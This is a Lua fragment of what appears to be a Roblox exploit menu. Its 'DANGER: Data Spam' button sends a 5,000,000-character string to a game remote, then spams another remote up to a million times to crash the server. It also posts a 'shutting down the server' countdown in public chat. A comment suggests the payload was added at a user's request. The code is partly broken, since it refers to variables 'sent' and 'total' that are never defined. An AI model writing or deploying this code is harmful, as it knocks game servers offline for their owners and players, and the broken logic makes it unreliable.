		local DangerDefaultText = "<font color=\"rgb(255, 220, 0)\"><b>!</b></font> DANGER: Data Spam <font color=\"rgb(255, 220, 0)\"><b>!</b></font>"
		local DangerDataRemote = {
			Armed = false,
			ArmedAt = 0,
			Countdown = false,
			Running = false,
			CancelCountdown = false,
			Button = nil,
			Gui = nil,
			Label = nil,
		}

		local function DangerNotify(title, description, time)
			local ok = false
			pcall(function()
				lib:Notify({
					Title = title,
					Description = description,
					Time = time or 6,
				})
				ok = true
			end)
			if not ok then
				pcall(function()
					fn18(description, title)
				end)
			end
		end

		local function DangerSetButtonText(text)
			pcall(function()
				if DangerDataRemote.Button then
					DangerDataRemote.Button.Text = text
					if DangerDataRemote.Button.Label then
						DangerDataRemote.Button.Label.Text = text
					end
				end
			end)
		end

		local function DangerShowCountdown(text)
			pcall(function()
				local playerGui = localPlayer:FindFirstChild("PlayerGui") or localPlayer:WaitForChild("PlayerGui", 2)
				if not playerGui then
					return
				end
				if not DangerDataRemote.Gui or not DangerDataRemote.Gui.Parent then
					local gui = Instance.new("ScreenGui")
					gui.Name = "KozmozDangerCountdown"
					gui.IgnoreGuiInset = true
					gui.ResetOnSpawn = false
					gui.DisplayOrder = 999
					gui.Parent = playerGui
					local lbl = Instance.new("TextLabel")
					lbl.Name = "Countdown"
					lbl.AnchorPoint = Vector2.new(0.5, 0.5)
					lbl.Position = UDim2.fromScale(0.515, 0.30)
					lbl.Size = UDim2.fromOffset(560, 200)
					lbl.BackgroundTransparency = 1
					lbl.Font = Enum.Font.GothamBlack
					lbl.TextColor3 = Color3.fromRGB(255, 45, 45)
					lbl.TextStrokeColor3 = Color3.fromRGB(255, 220, 0)
					lbl.TextStrokeTransparency = 0
					lbl.TextSize = 120
					lbl.Text = ""
					lbl.Parent = gui
					DangerDataRemote.Gui = gui
					DangerDataRemote.Label = lbl
				end
				DangerDataRemote.Gui.Enabled = true
				DangerDataRemote.Label.Text = text
			end)
		end

		local function DangerHideCountdown()
			pcall(function()
				if DangerDataRemote.Gui then
					DangerDataRemote.Gui.Enabled = false
				end
				if DangerDataRemote.Label then
					DangerDataRemote.Label.Text = ""
				end
			end)
		end

		local function DangerRunPayload()
			DangerDataRemote.Running = true
			DangerSetButtonText("<font color=\"rgb(255, 220, 0)\"><b>!</b></font> RUNNING - PRESS TO STOP <font color=\"rgb(255, 220, 0)\"><b>!</b></font>")
			task.spawn(function()
				local replicatedStorage = game:GetService("ReplicatedStorage")
				local dataEvents = replicatedStorage:FindFirstChild("DataEvents")
				local updateTextures = dataEvents and dataEvents:FindFirstChild("UpdateTexturesChoice")
				local dataRemote = dataEvents and dataEvents:FindFirstChild("DataRemoteEvent")
				if not updateTextures or not dataRemote then
					DangerNotify("DANGER!", "DataEvents / UpdateTexturesChoice / DataRemoteEvent was not found in this game - cancelled.", 6)
					DangerDataRemote.Running = false
					DangerSetButtonText(DangerDefaultText)
					return
				end
				-- KOZMOZ USER: the payload the user asked for (the guard above stays, so a
				-- game without these remotes is still cancelled instead of erroring).
				pcall(function()
					updateTextures:FireServer(string.rep("A", 5e6))
				end)

				for _ = 1, 1e6 do
					if not DangerDataRemote.Running then
						break
					end

					pcall(function()
						dataRemote:FireServer()
					end)
				end
				local finished = sent >= total
				DangerDataRemote.Running = false
				DangerSetButtonText(DangerDefaultText)
				DangerNotify("DANGER!", finished and "Finished." or "Stopped.", 5)
			end)
		end

		local function DangerSendChat(msg)
			pcall(function()
				local textChatService = game:GetService("TextChatService")
				local channels = textChatService and textChatService:FindFirstChild("TextChannels")
				local general = channels and channels:FindFirstChild("RBXGeneral")
				if general then
					general:SendAsync(msg)
					return
				end
				local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
				local sayMessage = chatEvents and chatEvents:FindFirstChild("SayMessageRequest")
				if sayMessage then
					sayMessage:FireServer(msg, "All")
				end
			end)
		end

		local function DangerChatSequence(ignoreCancel)
			if DangerDataRemote.ChatRunning then
				return
			end
			DangerDataRemote.ChatRunning = true
			local messages = { "shutting down the server.....", "1", "2", "3" }
			for i, msg in ipairs(messages) do
				if not ignoreCancel and DangerDataRemote.CancelCountdown then
					break
				end
				DangerSendChat(msg)
				if i < #messages then
				task.wait(1)
				end
			end
			DangerDataRemote.ChatRunning = false
		end
		local function DangerButtonPressed()
			if DangerDataRemote.Running then
				DangerDataRemote.Running = false
				DangerDataRemote.Armed = false
				DangerSetButtonText(DangerDefaultText)
				DangerNotify("DANGER!", "Stopped.", 5)
				return
			end
			if DangerDataRemote.Countdown then
				DangerDataRemote.CancelCountdown = true
				DangerDataRemote.Armed = false
				return
			end
			if DangerDataRemote.Armed and (os.clock() - DangerDataRemote.ArmedAt) <= 6 then
				DangerDataRemote.Armed = false
				DangerDataRemote.Countdown = true
				DangerDataRemote.CancelCountdown = false
				task.spawn(function() DangerChatSequence(false) end)
				task.spawn(function()
					for n = 3, 1, -1 do
						if DangerDataRemote.CancelCountdown then
							break
						end
						DangerShowCountdown(tostring(n))
						DangerSetButtonText("<font color=\"rgb(255, 220, 0)\"><b>!</b></font> STARTING IN " .. n .. " - PRESS TO CANCEL <font color=\"rgb(255, 220, 0)\"><b>!</b></font>")
						task.wait(1)
					end
					DangerHideCountdown()
					DangerDataRemote.Countdown = false
					if DangerDataRemote.CancelCountdown then
						DangerSetButtonText(DangerDefaultText)
						DangerNotify("DANGER!", "Cancelled.", 5)
						return
					end
					DangerRunPayload()
				end)
				return
			end
			DangerDataRemote.Armed = true
			DangerDataRemote.ArmedAt = os.clock()
			DangerSetButtonText("<font color=\"rgb(255, 220, 0)\"><b>!</b></font> ARE YOU SURE? PRESS AGAIN <font color=\"rgb(255, 220, 0)\"><b>!</b></font>")
			DangerNotify("Are you sure?", "Are you sure you want to do this?\n\nThis sends a 5,000,000 character UpdateTexturesChoice payload once, then spams DataRemoteEvent up to 1,000,000 times.\n\nPress the red ! button again within 6 seconds to confirm.", 6)
			task.delay(6, function()
				if DangerDataRemote.Armed and not DangerDataRemote.Running and not DangerDataRemote.Countdown and (os.clock() - DangerDataRemote.ArmedAt) >= 6 then
					DangerDataRemote.Armed = false
					DangerSetButtonText(DangerDefaultText)
				end
			end)
		end

